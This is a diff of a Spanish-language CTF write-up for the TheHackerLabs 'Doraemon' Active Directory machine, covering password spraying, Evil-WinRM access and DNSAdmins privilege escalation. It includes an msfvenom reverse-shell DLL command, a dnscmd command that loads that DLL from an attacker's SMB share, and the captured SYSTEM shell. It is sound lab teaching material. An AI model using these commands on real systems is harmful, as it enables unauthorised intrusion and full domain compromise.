@@ -1,11 +1,11 @@
 ---
 layout: single
 title: Doraemon - TheHackerLabs
-excerpt: "."
+excerpt: "Una máquina que es lo suficiente complicada. Después de analizar los escaneo e identificar que estamos contra una máquina que es Active Directory, vemos que es posible ver los recursos compartidos con el usuario guest. Ahí, encontramos un archivo que contiene una conversación entre varios personajes de Doraemon. Copiamos los nombres de estos personajes y otros más que aparecen en el mensaje, para aplicar Password Spraying con tal de identificar si algún usuario utilizo su propio usuario como contraseña. Encontramos a un usuario que usa como contraseña el nombre de un grupo, descrito en el mensaje y dicho usuario pertenece al servicio WinRM, lo que nos permite loguearnos con la herramienta Evil-WinRM. Una vez dentro, utilizamos winPEASx64.exe para enumerar la máquina, siendo así que encontramos un archivo oculto que contiene la contraseña de otro usuario. Para descubrir a qué usuario pertenece esa contraseña, volvemos a aplicar Password Spraying y lo encontramos, siendo que también pertenece al servicio WinRM. Logueándonos con el nuevo usuario, descubrimos que pertenece al grupo DNSAdmins, lo que nos permite crear y cargar una Reverse Shell almacenada en un archivo DLL, con tal de infectar el servicio DNS y nos permita escalar privilegios en otra sesión que capturara la Reverse Shell."
 date: 2025-04-09
 classes: wide
 header:
-  teaser: /assets/images/THL-writeup-doraemon/_logo.png
+  teaser: /assets/images/THL-writeup-doraemon/doraemon.jpg
   teaser_home_page: true
   icon: /assets/images/thehackerlabs.jpeg
 categories:
@@ -15,22 +15,52 @@ tags:
   - Windows
   - Active Directory
   - SMB
-  - 
-  - 
-  - 
+  - Kerberos
+  - SMB Enumeration
+  - Kerberos Enumeration
+  - Password Spraying Attack
+  - System Recognition (Windows)
+  - Abusing DNSAdmins Group
+  - Privesc - Abusing DNSAdmins Group
   - OSCP Style
 ---
-![](/assets/images/THL-writeup-doraemon/_logo.png)
+![](/assets/images/THL-writeup-doraemon/doraemon.jpg)
 
-texto
+------------
+**NOTA IMPORTANTE**:
+En caso de que tengas problemas con la configuración de la **máquina Doraemon** en **VirtualBox** y no encuentres la IP de la máquina usando **nmap o arp-scan**.
+
+Cambia la IP del **servidor DHCP** de la interfaz **Host-Only**, de tal manera que no ocupe la IP `192.168.10.5`, pues parece que la **máquina Doraemon**, ocupa esta IP por defecto.
+
+En mi caso, funciono eligiendo la IP `192.168.10.7`.
+
+<p align="center">
+<img src="/assets/images/THL-writeup-doraemon/Captura3.png">
+</p>
+
+------------
+
+<br>
+
+Una máquina que es lo suficiente complicada. Después de analizar los escaneo e identificar que estamos contra una máquina que es **Active Directory**, vemos que es posible ver los recursos compartidos con el **usuario guest**. Ahí, encontramos un archivo que contiene una conversación entre varios personajes de **Doraemon**. Copiamos los nombres de estos personajes y otros más que aparecen en el mensaje, para aplicar **Password Spraying** con tal de identificar si algún usuario utilizo su propio usuario como contraseña. Encontramos a un usuario que usa como contraseña el nombre de un grupo, descrito en el mensaje y dicho usuario pertenece al **servicio WinRM**, lo que nos permite loguearnos con la herramienta **Evil-WinRM**. Una vez dentro, utilizamos **winPEASx64.exe** para enumerar la máquina, siendo así que encontramos un archivo oculto que contiene la contraseña de otro usuario. Para descubrir a qué usuario pertenece esa contraseña, volvemos a aplicar **Password Spraying** y lo encontramos, siendo que también pertenece al **servicio WinRM**. Logueándonos con el nuevo usuario, descubrimos que pertenece al **grupo DNSAdmins**, lo que nos permite crear y cargar una **Reverse Shell** almacenada en un **archivo DLL**, con tal de infectar el **servicio DNS** y nos permita escalar privilegios en otra sesión que capturara la **Reverse Shell**.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
-* **
-* **
-* **
-* **
+* *arp-scan*
+* *crackmapexec*
+* *smbmap*
+* *kerbrute_linux_amd64*
+* *impacket-GetNPUsers*
+* *evil-winrm*
+* *winPEASx64.exe*
+* *whoami*
+* *msfvenom*
+* *impacket-smbserver*
+* *rlwrap*
+* *nc*
+* *dnscmd.exe*
+* *sc.exe*
 
 
 <br>
@@ -249,7 +279,7 @@ PORT      STATE SERVICE      VERSION
 49676/tcp open  msrpc        Microsoft Windows RPC
 49686/tcp open  msrpc        Microsoft Windows RPC
 49708/tcp open  msrpc        Microsoft Windows RPC
-MAC Address: 08:00:27:AA:49:AE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 Service Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
@@ -261,7 +291,7 @@ Host script results:
 |   Forest name: DORAEMON.THL
 |   FQDN: WIN-VRU3GG3DPLJ.DORAEMON.THL
 |_  System time: 2025-04-09T14:11:34+02:00
-|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:aa:49:ae (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: <unknown>, NetBIOS MAC: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 | smb2-time: 
 |   date: 2025-04-09T12:11:34
 |_  start_date: 2025-04-09T11:59:21
@@ -300,7 +330,7 @@ Además, vemos que el **servicio SMB** está aceptando el **usuario guest** como
 <br>
 
 
-<h2 id="SMB">Enumeración del Servicio SMB</h2>
+<h2 id="SMB">Enumeración de Servicio SMB</h2>
 
 Veamos qué nos reporta la herramienta **crackmapexec**:
 ```bash
@@ -404,7 +434,7 @@ Ok, podemos ignorar los mensajes que se están mandando y enfoquemonos en los no
 
 Los guardaremos en un archivo, quedando de esta manera:
 ```bash
-cat AD_users2.txt
+cat AD_users.txt
 administrador
 guest
 invitado
@@ -422,9 +452,12 @@ Con esto, podemos hacer algunas cosillas.
 
 <br>
 
-<h2 id="Kerberos">Enumeración de Usuarios de Kerberos y Aplicando Password Spraying</h2>
+<h2 id="Kerberos">Enumeración de Usuarios de Servicio Kerberos</h2>
 
 La idea es identificar a los usuarios que están registrados en la máquina víctima, y eso lo podemos hacer con la herramienta **Kerbrute**.
+
+Aquí la puedes obtener:
+* <a href="https://github.com/ropnop/kerbrute" target="_blank">Repositorio de ropnop: kerbrute</a>
 
 Veamos cuáles existen:
 ```bash
@@ -550,7 +583,7 @@ Estamos dentro.
 
 <br>
 
-<h2 id="Doraemon">Enumeración de Usuario Doraemon con winPEASx64.exe</h2>
+<h2 id="Doraemon">Enumeración de Máquina Víctima con winPEASx64.exe</h2>
 
 Dentro de este usuario, aún no encontraremos la flag del usuario y tampoco encontraremos algo dentro de sus directorios.
 
@@ -661,7 +694,7 @@ Probemos si sirve para el **servicio WinRM**:
 crackmapexec winrm 192.168.10.5 -u 'Suneo' -p '***********'
 SMB         192.168.10.5    5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL)
 HTTP        192.168.10.5    5985   WIN-VRU3GG3DPLJ  [*] http://192.168.10.5:5985/wsman
-WINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\Suneo:*********** (Pwn3d!
+WINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\Suneo:*********** (Pwn3d!)
 ```
 Genial.
 
@@ -682,7 +715,7 @@ doraemon\suneo
 Estamos dentro.
 
 Aquí si encontraremos la flag del usuario:
-```bash
+```batch
 *Evil-WinRM* PS C:\Users\Suneo\Documents> cd ../Desktop
 *Evil-WinRM* PS C:\Users\Suneo\Desktop> type user.txt
 ...
@@ -701,7 +734,7 @@ Aquí si encontraremos la flag del usuario:
 <h2 id="dnsGroup">Abusando de Grupo DNSAdmins para Cargar Reverse Shell en un Archivo DLL y Escalar Privilegios</h2>
 
 Revisemos que privilegios tiene este usuario:
-```bash
+```batch
 *Evil-WinRM* PS C:\Users\Suneo\Desktop> whoami /priv
 
 INFORMACIàN DE PRIVILEGIOS
@@ -716,7 +749,7 @@ SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habil
 Los mismos que los del usuario anterior.
 
 Veamos a que grupos pertenece:
-```bash
+```batch
 *Evil-WinRM* PS C:\Users\Suneo\Desktop> whoami /groups
 
 INFORMACIàN DE GRUPO
@@ -759,13 +792,23 @@ En resumen, nos explica como abusar de este grupo, para cargar un **archivo DLL*
 <img src="/assets/images/THL-writeup-doraemon/Captura1.png">
 </p>
 
-Continuemos y vamos a aplicarlo por pasos.
+Nos menciona otra, pero en mi caso, no me funciono:
+
+<br>
+
+<p align="center">
+<img src="/assets/images/THL-writeup-doraemon/Captura2.png">
+</p>
+
+<br>
+
+Continuemos.
 
 <br>
 
 * Primero vamos a generar nuestra **Reverse Shell** como un **archivo DLL**:
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.10.4 LPORT=443 -f dll -o revShell.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=Tu_IP LPORT=443 -f dll -o revShell.dll
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
@@ -794,7 +837,7 @@ listening on [any] 443 ...
 
 * Desde nuestra sesión de **Evil-WinRM**, usaremos el **binario dnscmd.exe** para interactuar directamente con el **archivo DLL** que tenemos en el **servidor SMB** con tal de pasarlo a la memoria como **SYSTEM**, y usando los parámetros **config y serverlevelplugindll**, le damos la ruta de nuestro servidor:
 ```batch
-*Evil-WinRM* PS C:\Users\Suneo\Desktop> dnscmd.exe /config /serverlevelplugindll \\192.168.10.4\smbFolder\revShell.dll
+*Evil-WinRM* PS C:\Users\Suneo\Desktop> dnscmd.exe /config /serverlevelplugindll \\Tu_IP\smbFolder\revShell.dll
 Propiedad del Registro serverlevelplugindll restablecida correctamente.
 Comando completado correctamente.
 ```
@@ -857,10 +900,10 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 ```batch
 rlwrap nc -nlvp 443
 listening on [any] 443 ...
-connect to [192.168.10.4] from (UNKNOWN) [192.168.10.5] 49703
+connect to [Tu_IP] from (UNKNOWN) [192.168.10.5] 49703
 Microsoft Windows [Versi�n 10.0.14393]
 (c) 2016 Microsoft Corporation. Todos los derechos reservados.
-
+.
 C:\Windows\system32>whoami
 whoami
 nt authority\system
@@ -868,10 +911,10 @@ nt authority\system
 Estamos dentro.
 
 Ya solo tenemos que buscar la última flag:
-```bash
+```batch
 C:\Windows\system32>cd C:\Users\Administrador\Desktop
 cd C:\Users\Administrador\Desktop
-
+.
 C:\Users\Administrador\Desktop>type root.txt
 type root.txt
 ...
@@ -886,6 +929,7 @@ Y con esto, terminamos la máquina.
 </div>
 
 
+* https://github.com/ropnop/kerbrute
 * https://github.com/peass-ng/PEASS-ng/tree/master
 * https://github.com/61106960/adPEAS/tree/main
 * https://github.com/SpecterOps/BloodHound
